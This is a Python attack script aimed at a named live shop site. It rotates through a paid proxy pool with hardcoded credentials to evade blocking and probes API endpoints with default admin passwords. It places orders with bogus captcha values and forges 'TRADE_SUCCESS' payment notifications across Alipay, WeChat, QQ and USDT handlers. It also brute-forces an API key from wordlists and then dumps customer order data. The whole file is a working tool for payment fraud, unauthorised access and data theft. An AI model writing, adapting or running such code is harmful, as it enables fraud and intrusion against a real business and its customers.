#!/usr/bin/env python3
"""Resilient qq1 probe: reuse QG query leases, rotate on fail, confirm POST auth, pay capture, slow tools brute."""
import hashlib
import json
import re
import subprocess
import time
import urllib.parse
from pathlib import Path

OUT = Path("/tmp/qq1_deep7")
OUT.mkdir(exist_ok=True)
QG, PW = "C413ED6D", "344F550A6F8B"
BASE = "https://qq1.lol"
JAR = str(OUT / "j2.jar")
LOG = OUT / "resilient.log"
REPORT = OUT / "resilient_report.json"
report = {"tests": [], "findings": [], "tools_tested": 0}


def log(m):
    line = f"[{time.strftime('%H:%M:%S')}] {m}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"kind": kind, "detail": detail, "body": (body or "")[:5000]}
    report["findings"].append(rec)
    open(OUT / "hits.jsonl", "a").write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:250]}")


class ProxyPool:
    def __init__(self):
        self.servers = []
        self.idx = 0
        self.refresh()

    def refresh(self):
        servers = []
        try:
            raw = subprocess.check_output(
                ["curl", "-s", "--max-time", "10", f"https://share.proxy.qg.net/query?key={QG}"],
                text=True, timeout=12,
            )
            d = json.loads(raw)
            for item in d.get("data") or []:
                if item.get("server"):
                    servers.append(item["server"])
        except Exception as e:
            log(f"query err {e}")
        # occasional get (rate limited)
        try:
            time.sleep(2)
            raw = subprocess.check_output(
                ["curl", "-s", "--max-time", "10", f"https://share.proxy.qg.net/get?key={QG}&num=2&area=440000"],
                text=True, timeout=12,
            )
            d = json.loads(raw)
            if d.get("code") == "SUCCESS":
                for item in d.get("data") or []:
                    servers.insert(0, item["server"])
            else:
                log(f"get: {d.get('code')} {d.get('message')}")
        except Exception as e:
            log(f"get err {e}")
        # dedupe
        seen = set()
        self.servers = [s for s in servers if s not in seen and not seen.add(s)]
        self.idx = 0
        log(f"pool size={len(self.servers)}")

    def current(self):
        if not self.servers:
            self.refresh()
        if not self.servers:
            return None
        return f"http://{QG}:{PW}@{self.servers[self.idx % len(self.servers)]}"

    def rotate(self):
        if not self.servers:
            self.refresh()
            return
        self.idx += 1
        if self.idx >= len(self.servers):
            self.refresh()


pool = ProxyPool()


def curl(url, post=None, mt=16, tries=6):
    last = ("", "000")
    for attempt in range(tries):
        px = pool.current()
        if not px:
            time.sleep(3)
            pool.refresh()
            continue
        cmd = [
            "curl", "-sk", "--max-time", str(mt), "-x", px, "-b", JAR, "-c", JAR,
            "-A", "Mozilla/5.0",
            "-H", "Referer: https://qq1.lol/",
            "-H", "X-Requested-With: XMLHttpRequest",
            "-H", "Content-Type: application/x-www-form-urlencoded",
            "-w", "\n__HTTP:%{http_code}",
        ]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
            cmd += ["-X", "POST", "-d", body]
        cmd.append(url)
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 6).stdout or ""
        except Exception as e:
            out = str(e)
        if "__HTTP:" not in out:
            pool.rotate()
            time.sleep(0.4)
            continue
        b, code = out.rsplit("__HTTP:", 1)
        code = code.strip()
        last = (b.strip(), code)
        if code == "200" and b.strip():
            return last
        pool.rotate()
        time.sleep(0.5)
    return last


def rec(name, body, code):
    report["tests"].append({"name": name, "code": code, "body": (body or "")[:500]})
    log(f"  {name}: HTTP={code} {(body or '')[:170]}")


def confirm_auth():
    log("=== CONFIRM AUTH (retry until stable) ===")
    targets = [
        ("change_POST_key", f"{BASE}/%61pi.php?act=change&id=25949&zt=1", {"key": "test"}),
        ("change_GET_key", f"{BASE}/%61pi.php?act=change&id=25949&zt=1&key=test", None),
        ("orders_POST_key", f"{BASE}/%61pi.php?act=orders", {"key": "test", "limit": "1", "tid": "102"}),
        ("orders_GET_key", f"{BASE}/%61pi.php?act=orders&key=test&limit=1&tid=102", None),
        ("search_POST_key", f"{BASE}/%61pi.php?act=search", {"id": "25949", "key": "test"}),
        ("tools_GET", f"{BASE}/%61pi.php?act=tools&key=test&limit=1", None),
        ("tools_POST", f"{BASE}/%61pi.php?act=tools", {"key": "test", "limit": "1"}),
        ("clone_GET", f"{BASE}/%61pi.php?act=clone&key=test", None),
        ("user_pass_change", f"{BASE}/%61pi.php?act=change&id=25949&zt=1",
         {"user": "admin", "pass": "admin123"}),
        ("user_pass_orders", f"{BASE}/%61pi.php?act=orders",
         {"user": "buyi", "pass": "buyi123", "limit": "1", "tid": "102"}),
    ]
    for name, url, post in targets:
        body, code = curl(url, post)
        rec(name, body, code)
        time.sleep(0.3)


def pay_and_notify():
    log("=== PAY + NOTIFY ===")
    Path(JAR).unlink(missing_ok=True)
    curl(BASE + "/")
    buy, code = curl(BASE + "/?mod=buy&cid=4&tid=102")
    for _ in range(5):
        if buy and "hashsalt" in buy:
            break
        pool.rotate()
        buy, code = curl(BASE + "/?mod=buy&cid=4&tid=102")
        time.sleep(1)
    csrf = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', buy or "")
    hs_m = re.search(r"var hashsalt=(.+);", buy or "")
    log(f"buy tokens csrf={bool(csrf)} hs={bool(hs_m)} len={len(buy or '')}")
    (OUT / "buy2.html").write_text(buy or "", errors="replace")
    if not csrf or not hs_m:
        return
    try:
        hs = subprocess.run(
            ["node", "-e", f"var hashsalt={hs_m.group(1)}; console.log(hashsalt)"],
            capture_output=True, text=True, timeout=5,
        ).stdout.strip()
    except Exception:
        hs = hs_m.group(1).strip().strip("'\"")
    pay, _ = curl(BASE + "/ajax.php?act=pay", {
        "tid": "102", "num": "1", "inputvalue": "deep7r",
        "csrf_token": csrf.group(1), "hashsalt": hs,
        "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan",
    })
    rec("pay", pay, "200")
    m = re.search(r'"trade_no"\s*:\s*"(\d+)"', pay or "")
    tn = m.group(1) if m else None
    report["trade_no"] = tn
    log(f"tn={tn}")
    if not tn:
        return
    for typ in ["alipay", "wxpay", "qqpay", "usdt"]:
        sub, code = curl(f"{BASE}/other/submit.php?type={typ}&orderid={tn}")
        (OUT / f"submit_{typ}.html").write_text(sub or "", errors="replace")
        pids = re.findall(r'name=["\']pid["\'][^>]*value=["\']([^"\']+)', sub or "", re.I)
        pids += re.findall(r"[?&]pid=([0-9]+)", sub or "")
        actions = re.findall(r'action=["\']([^"\']+)', sub or "", re.I)
        urls = list(dict.fromkeys(re.findall(r"https?://[a-zA-Z0-9._:/-]+", sub or "")))[:20]
        money = re.findall(r'name=["\']money["\'][^>]*value=["\']([^"\']+)', sub or "", re.I)
        signs = re.findall(r'name=["\']sign["\'][^>]*value=["\']([^"\']+)', sub or "", re.I)
        info = {"pids": pids, "actions": actions[:5], "urls": urls, "money": money, "signs": signs, "len": len(sub or "")}
        report[f"submit_{typ}"] = info
        log(f"submit_{typ}: {info}")
        # notify with extracted pid/money if any
        nb, _ = curl(f"{BASE}/other/notify.php?type={typ}", {
            "out_trade_no": tn, "trade_no": "E" + tn, "trade_status": "TRADE_SUCCESS",
            "money": money[0] if money else "1", "pid": pids[0] if pids else "1000",
            "type": typ, "sign": signs[0] if signs else "test", "name": "x",
        })
        rec(f"notify_{typ}", nb, "200")
        if nb and "success" in nb.lower() and "签名" not in nb and "失败" not in nb:
            hit("notify", typ, nb)
        time.sleep(0.4)


def slow_tools_brute(n=800):
    log("=== SLOW TOOLS BRUTE ===")
    base = [
        "buyi", "buyiq", "qqkqq", "qq1", "QQKZC", "ka1", "faka", "apikey", "token", "secret",
        "12345678", "qwerty", "by123456", "20251101", "2025-11-01", "ds_shop", "mckuai",
        "布衣", "发卡", "admin888", "root123", "qq123456", "telegram", "qqkzc",
    ]
    keys = []
    for w in base:
        for s in ["", "123", "888", "666", "2024", "2025", "2026", "!", "@", "key", "api", "001", "000"]:
            keys += [w + s, (w + s).upper()]
        keys.append(hashlib.md5(w.encode()).hexdigest())
        keys.append(hashlib.md5((w + "123").encode()).hexdigest())
    # short rockyou if present
    for p in ["/data/wordlists/rockyou-top10k.txt", "/usr/share/wordlists/rockyou.txt"]:
        fp = Path(p)
        if fp.exists():
            for i, line in enumerate(fp.read_text(errors="ignore").splitlines()):
                t = line.strip()
                if t:
                    keys.append(t)
                if i >= 2000:
                    break
            break
    seen = set()
    uniq = [k for k in keys if k not in seen and not seen.add(k)][:n]
    log(f"brute n={len(uniq)}")
    for i, k in enumerate(uniq):
        body, code = curl(f"{BASE}/%61pi.php?act=tools&key={urllib.parse.quote(k)}&limit=2", tries=4)
        report["tools_tested"] = i + 1
        if not body:
            continue
        if "密钥错误" in body or "确保各项" in body:
            pass
        elif body.startswith("[") or ('"tid"' in body and "错误" not in body):
            hit("TOOLS_KEY", k, body)
            (OUT / "TOOLS_KEY_HIT.txt").write_text(k + "\n" + body[:8000])
            # try orders dump via POST and GET
            for style in ["get", "post"]:
                if style == "get":
                    o, _ = curl(f"{BASE}/%61pi.php?act=orders&key={urllib.parse.quote(k)}&limit=50&tid=102&sign=1")
                else:
                    o, _ = curl(f"{BASE}/%61pi.php?act=orders", {"key": k, "limit": "50", "tid": "102", "sign": "1"})
                (OUT / f"orders_{style}.json").write_text((o or "")[:200000])
                log(f"orders_{style}: {(o or '')[:150]}")
            break
        elif "请提供" not in body and "<!DOCTYPE" not in body[:30]:
            log(f"unusual {k!r}: {body[:100]}")
        if i and i % 50 == 0:
            log(f"progress {i}/{len(uniq)}")
            pool.refresh()
            REPORT.write_text(json.dumps(report, ensure_ascii=False, indent=2))
        time.sleep(0.15)


def main():
    open(LOG, "w").write("")
    log("=== RESILIENT START ===")
    confirm_auth()
    pay_and_notify()
    slow_tools_brute(600)
    REPORT.write_text(json.dumps(report, ensure_ascii=False, indent=2))
    log(f"=== DONE findings={len(report['findings'])} tools={report['tools_tested']} ===")


if __name__ == "__main__":
    main()
